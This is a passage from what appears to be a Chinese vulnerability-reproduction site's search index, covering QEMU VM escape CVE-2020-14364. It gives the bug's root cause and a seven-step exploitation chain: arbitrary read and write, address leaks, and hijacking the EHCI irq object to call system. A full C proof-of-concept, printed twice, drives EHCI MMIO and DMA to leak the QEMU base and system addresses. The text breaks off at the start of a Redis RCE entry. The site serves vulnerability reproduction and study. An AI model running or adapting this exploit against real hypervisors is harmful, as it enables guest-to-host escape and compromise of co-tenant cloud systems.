\u6cc4\u9732USBdevice\u5bf9\u8c61\u7684\u5730\u5740\u3002 \u00b6 \u89c2\u5bdf\u8d8a\u754c\u53ef\u8bfb\u5185\u5bb9\u53d1\u73b0 \u53ef\u4ee5\u4ece\u4e0b\u65b9\u7684ep_ctl->dev\u83b7\u53d6\u5230usbdevice\u7684\u5bf9\u8c61\u5730\u5740\u3002 2. \u901a\u8fc7usbdevice\u7684\u5bf9\u8c61\u5730\u5740\u6211\u4eec\u53ef\u4ee5\u5f97\u5230s->data_buf\u7684\u4f4d\u7f6e\uff0c\u4e4b\u540e\u53ea\u9700\u8981\u8986\u76d6\u4e0b\u65b9\u7684setup_index\u4e3a\u76ee\u6807\u5730\u5740-(s->data_buf)\u5373\u53ef\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u3002 3. \u6211\u4eec\u8fd8\u9700\u8981\u83b7\u53d6\u4efb\u4f55\u5730\u5740\u8bfb\u53d6\u529f\u80fd\uff0csetup_buf [0]\u63a7\u5236\u5199\u5165\u65b9\u5411\uff0c\u5e76\u4e14\u53ea\u80fd\u7531do_token_setup\u8fdb\u884c\u4fee\u6539\u3002 \u7531\u4e8e\u6211\u4eec\u5728\u7b2c\u4e8c\u6b65\u4e2d\u4f7f\u7528\u4e86\u8d8a\u754c\u5199\u5165\u529f\u80fd\uff0c\u56e0\u6b64setup_buf [0]\u662f\u5199\u5165\u65b9\u5411\uff0c\u56e0\u6b64\u53ea\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u64cd\u4f5c\uff0c\u65e0\u6cd5\u8bfb\u53d6\u3002\u7ed5\u8fc7\u65b9\u6cd5\uff1a\u8bbe\u7f6esetup_index = 0xfffffff8\uff0c\u518d\u6b21\u8d8a\u754c\uff0c\u4fee\u6539setup_buf [0]\u7684\u503c\uff0c\u7136\u540e\u518d\u6b21\u5c06setup_index\u4fee\u6539\u4e3a\u8981\u8bfb\u53d6\u7684\u5730\u5740\uff0c\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u53d6\u3002 4.\u901a\u8fc7\u4efb\u610f\u5730\u5740\u8bfb\u53d6usbdevice\u5bf9\u8c61\u7684\u5185\u5bb9\u4ee5\u83b7\u53d6ehcistate\u5bf9\u8c61\u5730\u5740\uff0c\u518d\u6b21\u4f7f\u7528\u4efb\u610f\u5730\u5740\u8bfb\u53d6ehcistate\u5bf9\u8c61\u7684\u5185\u5bb9\u4ee5\u83b7\u53d6ehci_bus_ops_companion\u5730\u5740\u3002 \u8be5\u5730\u5740\u4f4d\u4e8e\u7a0b\u5e8fdata\u8282\u533a\u3002 \u8fd9\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u7a0b\u5e8f\u7684\u52a0\u8f7d\u5730\u5740\u548csystem @ plt\u5730\u5740\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6usbdevice\u56fa\u5b9a\u504f\u79fb\u4f4d\u7f6e\u540e\u7684usb-tablet\u5bf9\u8c61\u6765\u83b7\u5f97\u52a0\u8f7d\u5730\u5740\u3002 5.\u5728data_buf\u4e2d\u4f2a\u9020irq\u7ed3\u6784\u3002 6.\u4ee5\u4f2a\u9020\u7ed3\u6784\u52ab\u6301ehcistate\u4e2d\u7684irq\u5bf9\u8c61\u3002 7.\u901a\u8fc7mmio\u8bfb\u53d6\u5bc4\u5b58\u5668\u4ee5\u89e6\u53d1ehci_update_irq\uff0c\u6267\u884csystem\uff08\u201c xcalc\u201d\uff09\u3002 \u5b8c\u6210\u5229\u7528 QEMU CVE-2020-14364 POC \u89c6\u9891\u6f14\u793a \u6f0f\u6d1e\u5229\u7528POC \u00b6 #include <assert.h> #include <fcntl.h> #include <inttypes.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/mman.h> #include <sys/types.h> #include <unistd.h> #include <sys/io.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <errno.h> #include <sys/types.h> #include <sys/socket.h> #include <stdbool.h> #include <netinet/in.h> unsigned char * mmio_mem ; char * dmabuf ; struct ohci_hcca * hcca ; struct EHCIqtd * qtd ; struct ohci_ed * ed ; struct ohci_td * td ; char * setup_buf ; uint32_t * dmabuf32 ; char * td_addr ; struct EHCIqh * qh ; struct ohci_td * td_1 ; char * dmabuf_phys_addr ; typedef struct USBDevice USBDevice ; typedef struct USBEndpoint USBEndpoint ; struct USBEndpoint { uint8_t nr ; uint8_t pid ; uint8_t type ; uint8_t ifnum ; int max_packet_size ; int max_streams ; bool pipeline ; bool halted ; USBDevice * dev ; USBEndpoint * fd ; USBEndpoint * bk ; }; struct USBDevice { int32_t remote_wakeup ; int32_t setup_state ; int32_t setup_len ; int32_t setup_index ; USBEndpoint ep_ctl ; USBEndpoint ep_in [ 15 ]; USBEndpoint ep_out [ 15 ]; }; typedef struct EHCIqh { uint32_t next ; /* Standard next link pointer */ /* endpoint characteristics */ uint32_t epchar ; /* endpoint capabilities */ uint32_t epcap ; uint32_t current_qtd ; /* Standard next link pointer */ uint32_t next_qtd ; /* Standard next link pointer */ uint32_t altnext_qtd ; uint32_t token ; /* Same as QTD token */ uint32_t bufptr [ 5 ]; /* Standard buffer pointer */ } EHCIqh ; typedef struct EHCIqtd { uint32_t next ; /* Standard next link pointer */ uint32_t altnext ; /* Standard next link pointer */ uint32_t token ; uint32_t bufptr [ 5 ]; /* Standard buffer pointer */ } EHCIqtd ; uint64_t virt2phys ( void * p ) { uint64_t virt = ( uint64_t ) p ; // Assert page alignment int fd = open ( \"/proc/self/pagemap\" , O_RDONLY ); if ( fd == -1 ) die ( \"open\" ); uint64_t offset = ( virt / 0x1000 ) * 8 ; lseek ( fd , offset , SEEK_SET ); uint64_t phys ; if ( read ( fd , & phys , 8 ) != 8 ) die ( \"read\" ); // Assert page present phys = ( phys & (( 1ULL << 54 ) - 1 )) * 0x1000 + ( virt & 0xfff ); return phys ; } void die ( const char * msg ) { perror ( msg ); exit ( -1 ); } void mmio_write ( uint32_t addr , uint32_t value ) { * (( uint32_t * )( mmio_mem + addr )) = value ; } uint64_t mmio_read ( uint32_t addr ) { return * (( uint64_t * )( mmio_mem + addr )); } void init (){ int mmio_fd = open ( \"/sys/devices/pci0000:00/0000:00:05.7/resource0\" , O_RDWR | O_SYNC ); if ( mmio_fd == -1 ) die ( \"mmio_fd open failed\" ); mmio_mem = mmap ( 0 , 0x1000 , PROT_READ | PROT_WRITE , MAP_SHARED , mmio_fd , 0 ); if ( mmio_mem == MAP_FAILED ) die ( \"mmap mmio_mem failed\" ); dmabuf = mmap ( 0 , 0x3000 , PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS , -1 , 0 ); if ( dmabuf == MAP_FAILED ) die ( \"mmap\" ); mlock ( dmabuf , 0x3000 ); hcca = dmabuf ; dmabuf32 = dmabuf + 4 ; qtd = dmabuf + 0x200 ; qh = dmabuf + 0x100 ; setup_buf = dmabuf + 0x300 ; } void init_state (){ mmio_write ( 0x64 , 0x100 ); mmio_write ( 0x64 , 0x4 ); qh -> epchar = 0x00 ; qh -> token = 1 << 7 ; qh -> current_qtd = virt2phys ( dmabuf + 0x200 ); struct EHCIqtd * qtd ; qtd = dmabuf + 0x200 ; qtd -> token = 1 << 7 | 2 << 8 | 8 << 16 ; qtd -> bufptr [ 0 ] = virt2phys ( dmabuf + 0x300 ); setup_buf [ 6 ] = 0xff ; setup_buf [ 7 ] = 0x0 ; dmabuf32 [ 0 ] = virt2phys ( dmabuf + 0x100 ) + 0x2 ; mmio_write ( 0x28 , 0x0 ); mmio_write ( 0x30 , 0x0 ); mmio_write ( 0x38 , virt2phys ( dmabuf )); mmio_write ( 0x34 , virt2phys ( dmabuf )); mmio_write ( 0x20 , 0x11 ); } void set_length ( uint16_t len , uint8_t in ){ mmio_write ( 0x64 , 0x100 ); mmio_write ( 0x64 , 0x4 ); setup_buf [ 0 ] = in ; setup_buf [ 6 ] = len & 0xff ; setup_buf [ 7 ] = ( len >> 8 ) & 0xff ; qh -> epchar = 0x00 ; qh -> token = 1 << 7 ; qh -> current_qtd = virt2phys ( dmabuf + 0x200 ); qtd -> token = 1 << 7 | 2 << 8 | 8 << 16 ; qtd -> bufptr [ 0 ] = virt2phys ( dmabuf + 0x300 ); dmabuf32 [ 0 ] = virt2phys ( dmabuf + 0x100 ) + 0x2 ; mmio_write ( 0x28 , 0x0 ); mmio_write ( 0x30 , 0x0 ); mmio_write ( 0x38 , virt2phys ( dmabuf )); mmio_write ( 0x34 , virt2phys ( dmabuf )); mmio_write ( 0x20 , 0x11 ); } void do_copy_read (){ mmio_write ( 0x64 , 0x100 ); mmio_write ( 0x64 , 0x4 ); qh -> epchar = 0x00 ; qh -> token = 1 << 7 ; qh -> current_qtd = virt2phys ( dmabuf + 0x200 ); qtd -> token = 1 << 7 | 1 << 8 | 0x1f00 << 16 ; qtd -> bufptr [ 0 ] = virt2phys ( dmabuf + 0x1000 ); qtd -> bufptr [ 1 ] = virt2phys ( dmabuf + 0x2000 ); dmabuf32 [ 0 ] = virt2phys ( dmabuf + 0x100 ) + 0x2 ; mmio_write ( 0x28 , 0x0 ); mmio_write ( 0x30 , 0x0 ); mmio_write ( 0x38 , virt2phys ( dmabuf )); mmio_write ( 0x34 , virt2phys ( dmabuf )); mmio_write ( 0x20 , 0x11 ); } int main () { init (); iopl ( 3 ); outw ( 0 , 0xc0c0 ); outw ( 0 , 0xc0e0 ); outw ( 0 , 0xc010 ); outw ( 0 , 0xc0a0 ); sleep ( 3 ); init_state (); sleep ( 2 ); set_length ( 0x2000 , 0x80 ); sleep ( 2 ); do_copy_read (); sleep ( 2 ); struct USBDevice * usb_device_tmp = dmabuf + 0x2004 ; struct USBDevice usb_device ; memcpy ( & usb_device , usb_device_tmp , sizeof ( USBDevice )); uint64_t dev_addr = usb_device . ep_ctl . dev ; uint64_t * tmp = dmabuf + 0x24f4 ; long long base =* tmp ; if ( base == 0 ){ printf ( \"INIT DOWN,DO IT AGAIN\" ); return 0 ; } base -= 0xee5480-0x2668c0 ; uint64_t system = base + 0x2d9610 ; puts ( \" \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ \" ); printf ( \"LEAK BASE ADDRESS:%llx! \\n \" , base ); printf ( \"LEAK SYSTEM ADDRESS:%llx! \\n \" , system ); puts ( \" \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ \" ); }","title":"QEMU \u865a\u62df\u673a\u9003\u9038\u6f0f\u6d1e CVE-2020-14364"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Qemu/QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/#qemu-\u865a\u62df\u673a\u9003\u9038\u6f0f\u6d1e-cve-2020-14364","text":"","title":"QEMU \u865a\u62df\u673a\u9003\u9038\u6f0f\u6d1e CVE-2020-14364"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Qemu/QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5f53\u5730\u65f6\u95f48\u670824\u65e5\uff0c\u4e00\u4e2a\u5b58\u5728\u4e8eQEMU USB\u6a21\u62df\u5668\u4e2d\u7684\u8d8a\u754c\u8bfb\u5199\u6f0f\u6d1e\uff08CVE-2020-14364\uff09\u88ab\u516c\u5e03\u3002 \u6f0f\u6d1e\u4f4d\u4e8e ./hw/usb/core.c \u4e2d\uff0c\u5f53\u7a0b\u5e8f\u5904\u7406\u6765\u81ea\u5ba2\u6237\u673a\u7684USB\u6570\u636e\u5305\u65f6\uff0c\u5982\u679c\u5728 do_token_in \u4e0e do_token_out\u4e2d\u2019USBDevice->setup_len\u2019\u8d85\u8fc7\u4e86USBDevice->data_buf[4096]\uff0c\u5219\u5b58\u5728\u95ee\u9898\u3002 \u5ba2\u6237\u673a\u7528\u6237\u53ef\u80fd\u4f1a\u4f7f\u7528\u6b64\u6f0f\u6d1e\u4f7fQEMU\u8fdb\u7a0b\u5d29\u6e83\uff0c\u4ece\u800c\u5bfc\u81f4DoS\u6216\u5728\u5bbf\u4e3b\u673a\u4e0a\u4ee5QEMU\u8fdb\u7a0b\u7684\u7279\u6743\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5b9e\u73b0\u865a\u62df\u673a\u9003\u9038\u3002 \u653b\u51fb\u8005\u5728\u62e5\u6709\u4e91\u73af\u5883\u865a\u62df\u673a\u64cd\u4f5c\u7cfb\u7edf\u6743\u9650\u7684\u60c5\u51b5\u4e0b\uff0c\u4fbf\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u5bbf\u4e3b\u673a\u6743\u9650\uff0c\u8fdb\u800c\u653b\u51fb\u865a\u62df\u673a\u6240\u5728\u8d44\u6e90\u6c60\u6240\u6709\u79df\u6237\u4e3b\u673a\uff0c\u751a\u81f3\u53ef\u901a\u8fc7\u5df2\u5f00\u901a\u7684\u5185\u7f51\u6743\u9650\u653b\u51fb\u7ba1\u7406\u57df\u7cfb\u7edf\uff0c\u98ce\u9669\u6781\u9ad8\u3002 \u672c\u6b21\u6f0f\u6d1e\u7684\u5f71\u54cd\u8303\u56f4\u8f83\u5e7f\uff0c\u6d89\u53caqemu 1.0 \u4ee5\u4e0a\u7684\u5168\u90e8\u7248\u672c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Qemu/QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Qemu > 1.0","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Qemu/QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/#\u6f0f\u6d1e\u590d\u73b0","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Qemu/QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/#\u6f0f\u6d1e\u539f\u7406","text":"USB\u603b\u7ebf\u901a\u8fc7\u521b\u5efa\u4e00\u4e2aUSBpacket\u5bf9\u8c61\u6765\u548cUSB\u8bbe\u5907\u901a\u4fe1\u3002 Usbpacket\u5bf9\u8c61\u4e2d\u5305\u542b\u4ee5\u4e0b\u5173\u952e\u5185\u5bb9 \u5176\u4e2dpid\u8868\u660epacket\u7684\u7c7b\u578b\uff0c\u5b58\u5728\u4e09\u79cd\u7c7b\u578bin\u3001out\u3001setup, ep\u6307\u5411endpoint\u5bf9\u8c61\uff0c\u901a\u8fc7\u6b64\u7ed3\u6784\u5b9a\u4f4d\u76ee\u6807usb\u8bbe\u5907\u3002 \u6570\u636e\u4ea4\u6362\u4e3ausbdevice\u4e2d\u7f13\u51b2\u533a\u7684data_buf\u4e0eusbpacket\u5bf9\u8c61\u4e2d\u4f7f\u7528usb_packet_map\u7533\u8bf7\u7684\u7f13\u51b2\u533a\u4e24\u8005\u95f4\u901a\u8fc7usb_packet_copy\u51fd\u6570\u5b9e\u73b0,\u4e3a\u4e86\u9632\u6b62\u4e24\u8005\u7f13\u51b2\u533a\u957f\u5ea6\u4e0d\u5339\u914d\uff0c\u4f20\u9001\u7684\u957f\u5ea6\u7531s->setup_len\u9650\u5236\u3002 \u6f0f\u6d1e\u5b58\u5728\u4e8es->setup_len\u8d4b\u503c\u7684\u8fc7\u7a0bdo_token_setup\u4e2d\u3002 \u867d\u7136\u8fdb\u884c\u4e86\u6821\u9a8c\uff0c\u4f46\u662f\u7531\u4e8e\u5728\u6821\u9a8c\u524d\uff0cs->setup_len\u7684\u503c\u5df2\u7ecf\u88ab\u8bbe\u7f6e\u5bfc\u81f4\u4e4b\u540e\u7684do_token_in\u6216\u8005do_token_out\u4e2d\u4f7f\u7528usb_packet_copy\u65f6\u4f1a\u4ea7\u751f\u8d8a\u754c\u8bfb\u5199\u6f0f\u6d1e\u3002","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Qemu/QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/#\u5229\u7528\u65b9\u5f0f","text":"","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Qemu/QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/#1--\u6cc4\u9732usbdevice\u5bf9\u8c61\u7684\u5730\u5740","text":"\u89c2\u5bdf\u8d8a\u754c\u53ef\u8bfb\u5185\u5bb9\u53d1\u73b0 \u53ef\u4ee5\u4ece\u4e0b\u65b9\u7684ep_ctl->dev\u83b7\u53d6\u5230usbdevice\u7684\u5bf9\u8c61\u5730\u5740\u3002 2. \u901a\u8fc7usbdevice\u7684\u5bf9\u8c61\u5730\u5740\u6211\u4eec\u53ef\u4ee5\u5f97\u5230s->data_buf\u7684\u4f4d\u7f6e\uff0c\u4e4b\u540e\u53ea\u9700\u8981\u8986\u76d6\u4e0b\u65b9\u7684setup_index\u4e3a\u76ee\u6807\u5730\u5740-(s->data_buf)\u5373\u53ef\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u3002 3. \u6211\u4eec\u8fd8\u9700\u8981\u83b7\u53d6\u4efb\u4f55\u5730\u5740\u8bfb\u53d6\u529f\u80fd\uff0csetup_buf [0]\u63a7\u5236\u5199\u5165\u65b9\u5411\uff0c\u5e76\u4e14\u53ea\u80fd\u7531do_token_setup\u8fdb\u884c\u4fee\u6539\u3002 \u7531\u4e8e\u6211\u4eec\u5728\u7b2c\u4e8c\u6b65\u4e2d\u4f7f\u7528\u4e86\u8d8a\u754c\u5199\u5165\u529f\u80fd\uff0c\u56e0\u6b64setup_buf [0]\u662f\u5199\u5165\u65b9\u5411\uff0c\u56e0\u6b64\u53ea\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u64cd\u4f5c\uff0c\u65e0\u6cd5\u8bfb\u53d6\u3002\u7ed5\u8fc7\u65b9\u6cd5\uff1a\u8bbe\u7f6esetup_index = 0xfffffff8\uff0c\u518d\u6b21\u8d8a\u754c\uff0c\u4fee\u6539setup_buf [0]\u7684\u503c\uff0c\u7136\u540e\u518d\u6b21\u5c06setup_index\u4fee\u6539\u4e3a\u8981\u8bfb\u53d6\u7684\u5730\u5740\uff0c\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u53d6\u3002 4.\u901a\u8fc7\u4efb\u610f\u5730\u5740\u8bfb\u53d6usbdevice\u5bf9\u8c61\u7684\u5185\u5bb9\u4ee5\u83b7\u53d6ehcistate\u5bf9\u8c61\u5730\u5740\uff0c\u518d\u6b21\u4f7f\u7528\u4efb\u610f\u5730\u5740\u8bfb\u53d6ehcistate\u5bf9\u8c61\u7684\u5185\u5bb9\u4ee5\u83b7\u53d6ehci_bus_ops_companion\u5730\u5740\u3002 \u8be5\u5730\u5740\u4f4d\u4e8e\u7a0b\u5e8fdata\u8282\u533a\u3002 \u8fd9\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u7a0b\u5e8f\u7684\u52a0\u8f7d\u5730\u5740\u548csystem @ plt\u5730\u5740\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6usbdevice\u56fa\u5b9a\u504f\u79fb\u4f4d\u7f6e\u540e\u7684usb-tablet\u5bf9\u8c61\u6765\u83b7\u5f97\u52a0\u8f7d\u5730\u5740\u3002 5.\u5728data_buf\u4e2d\u4f2a\u9020irq\u7ed3\u6784\u3002 6.\u4ee5\u4f2a\u9020\u7ed3\u6784\u52ab\u6301ehcistate\u4e2d\u7684irq\u5bf9\u8c61\u3002 7.\u901a\u8fc7mmio\u8bfb\u53d6\u5bc4\u5b58\u5668\u4ee5\u89e6\u53d1ehci_update_irq\uff0c\u6267\u884csystem\uff08\u201c xcalc\u201d\uff09\u3002 \u5b8c\u6210\u5229\u7528 QEMU CVE-2020-14364 POC \u89c6\u9891\u6f14\u793a","title":"1.  \u6cc4\u9732USBdevice\u5bf9\u8c61\u7684\u5730\u5740\u3002"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Qemu/QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20CVE-2020-14364/#\u6f0f\u6d1e\u5229\u7528poc","text":"#include <assert.h> #include <fcntl.h> #include <inttypes.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/mman.h> #include <sys/types.h> #include <unistd.h> #include <sys/io.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <errno.h> #include <sys/types.h> #include <sys/socket.h> #include <stdbool.h> #include <netinet/in.h> unsigned char * mmio_mem ; char * dmabuf ; struct ohci_hcca * hcca ; struct EHCIqtd * qtd ; struct ohci_ed * ed ; struct ohci_td * td ; char * setup_buf ; uint32_t * dmabuf32 ; char * td_addr ; struct EHCIqh * qh ; struct ohci_td * td_1 ; char * dmabuf_phys_addr ; typedef struct USBDevice USBDevice ; typedef struct USBEndpoint USBEndpoint ; struct USBEndpoint { uint8_t nr ; uint8_t pid ; uint8_t type ; uint8_t ifnum ; int max_packet_size ; int max_streams ; bool pipeline ; bool halted ; USBDevice * dev ; USBEndpoint * fd ; USBEndpoint * bk ; }; struct USBDevice { int32_t remote_wakeup ; int32_t setup_state ; int32_t setup_len ; int32_t setup_index ; USBEndpoint ep_ctl ; USBEndpoint ep_in [ 15 ]; USBEndpoint ep_out [ 15 ]; }; typedef struct EHCIqh { uint32_t next ; /* Standard next link pointer */ /* endpoint characteristics */ uint32_t epchar ; /* endpoint capabilities */ uint32_t epcap ; uint32_t current_qtd ; /* Standard next link pointer */ uint32_t next_qtd ; /* Standard next link pointer */ uint32_t altnext_qtd ; uint32_t token ; /* Same as QTD token */ uint32_t bufptr [ 5 ]; /* Standard buffer pointer */ } EHCIqh ; typedef struct EHCIqtd { uint32_t next ; /* Standard next link pointer */ uint32_t altnext ; /* Standard next link pointer */ uint32_t token ; uint32_t bufptr [ 5 ]; /* Standard buffer pointer */ } EHCIqtd ; uint64_t virt2phys ( void * p ) { uint64_t virt = ( uint64_t ) p ; // Assert page alignment int fd = open ( \"/proc/self/pagemap\" , O_RDONLY ); if ( fd == -1 ) die ( \"open\" ); uint64_t offset = ( virt / 0x1000 ) * 8 ; lseek ( fd , offset , SEEK_SET ); uint64_t phys ; if ( read ( fd , & phys , 8 ) != 8 ) die ( \"read\" ); // Assert page present phys = ( phys & (( 1ULL << 54 ) - 1 )) * 0x1000 + ( virt & 0xfff ); return phys ; } void die ( const char * msg ) { perror ( msg ); exit ( -1 ); } void mmio_write ( uint32_t addr , uint32_t value ) { * (( uint32_t * )( mmio_mem + addr )) = value ; } uint64_t mmio_read ( uint32_t addr ) { return * (( uint64_t * )( mmio_mem + addr )); } void init (){ int mmio_fd = open ( \"/sys/devices/pci0000:00/0000:00:05.7/resource0\" , O_RDWR | O_SYNC ); if ( mmio_fd == -1 ) die ( \"mmio_fd open failed\" ); mmio_mem = mmap ( 0 , 0x1000 , PROT_READ | PROT_WRITE , MAP_SHARED , mmio_fd , 0 ); if ( mmio_mem == MAP_FAILED ) die ( \"mmap mmio_mem failed\" ); dmabuf = mmap ( 0 , 0x3000 , PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS , -1 , 0 ); if ( dmabuf == MAP_FAILED ) die ( \"mmap\" ); mlock ( dmabuf , 0x3000 ); hcca = dmabuf ; dmabuf32 = dmabuf + 4 ; qtd = dmabuf + 0x200 ; qh = dmabuf + 0x100 ; setup_buf = dmabuf + 0x300 ; } void init_state (){ mmio_write ( 0x64 , 0x100 ); mmio_write ( 0x64 , 0x4 ); qh -> epchar = 0x00 ; qh -> token = 1 << 7 ; qh -> current_qtd = virt2phys ( dmabuf + 0x200 ); struct EHCIqtd * qtd ; qtd = dmabuf + 0x200 ; qtd -> token = 1 << 7 | 2 << 8 | 8 << 16 ; qtd -> bufptr [ 0 ] = virt2phys ( dmabuf + 0x300 ); setup_buf [ 6 ] = 0xff ; setup_buf [ 7 ] = 0x0 ; dmabuf32 [ 0 ] = virt2phys ( dmabuf + 0x100 ) + 0x2 ; mmio_write ( 0x28 , 0x0 ); mmio_write ( 0x30 , 0x0 ); mmio_write ( 0x38 , virt2phys ( dmabuf )); mmio_write ( 0x34 , virt2phys ( dmabuf )); mmio_write ( 0x20 , 0x11 ); } void set_length ( uint16_t len , uint8_t in ){ mmio_write ( 0x64 , 0x100 ); mmio_write ( 0x64 , 0x4 ); setup_buf [ 0 ] = in ; setup_buf [ 6 ] = len & 0xff ; setup_buf [ 7 ] = ( len >> 8 ) & 0xff ; qh -> epchar = 0x00 ; qh -> token = 1 << 7 ; qh -> current_qtd = virt2phys ( dmabuf + 0x200 ); qtd -> token = 1 << 7 | 2 << 8 | 8 << 16 ; qtd -> bufptr [ 0 ] = virt2phys ( dmabuf + 0x300 ); dmabuf32 [ 0 ] = virt2phys ( dmabuf + 0x100 ) + 0x2 ; mmio_write ( 0x28 , 0x0 ); mmio_write ( 0x30 , 0x0 ); mmio_write ( 0x38 , virt2phys ( dmabuf )); mmio_write ( 0x34 , virt2phys ( dmabuf )); mmio_write ( 0x20 , 0x11 ); } void do_copy_read (){ mmio_write ( 0x64 , 0x100 ); mmio_write ( 0x64 , 0x4 ); qh -> epchar = 0x00 ; qh -> token = 1 << 7 ; qh -> current_qtd = virt2phys ( dmabuf + 0x200 ); qtd -> token = 1 << 7 | 1 << 8 | 0x1f00 << 16 ; qtd -> bufptr [ 0 ] = virt2phys ( dmabuf + 0x1000 ); qtd -> bufptr [ 1 ] = virt2phys ( dmabuf + 0x2000 ); dmabuf32 [ 0 ] = virt2phys ( dmabuf + 0x100 ) + 0x2 ; mmio_write ( 0x28 , 0x0 ); mmio_write ( 0x30 , 0x0 ); mmio_write ( 0x38 , virt2phys ( dmabuf )); mmio_write ( 0x34 , virt2phys ( dmabuf )); mmio_write ( 0x20 , 0x11 ); } int main () { init (); iopl ( 3 ); outw ( 0 , 0xc0c0 ); outw ( 0 , 0xc0e0 ); outw ( 0 , 0xc010 ); outw ( 0 , 0xc0a0 ); sleep ( 3 ); init_state (); sleep ( 2 ); set_length ( 0x2000 , 0x80 ); sleep ( 2 ); do_copy_read (); sleep ( 2 ); struct USBDevice * usb_device_tmp = dmabuf + 0x2004 ; struct USBDevice usb_device ; memcpy ( & usb_device , usb_device_tmp , sizeof ( USBDevice )); uint64_t dev_addr = usb_device . ep_ctl . dev ; uint64_t * tmp = dmabuf + 0x24f4 ; long long base =* tmp ; if ( base == 0 ){ printf ( \"INIT DOWN,DO IT AGAIN\" ); return 0 ; } base -= 0xee5480-0x2668c0 ; uint64_t system = base + 0x2d9610 ; puts ( \" \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ \" ); printf ( \"LEAK BASE ADDRESS:%llx! \\n \" , base ); printf ( \"LEAK SYSTEM ADDRESS:%llx! \\n \" , system ); puts ( \" \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ \" ); }","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Redis/Redis%20%E5%B0%8F%E4%BA%8E5.0.5%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE%20/","text":"Redis <= 5.0.5 \u4e3b\u4ece\u590d\u5236 RCE \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u57282019\u5e747\u67087\u65e5\u7ed3\u675f\u7684WCTF2019 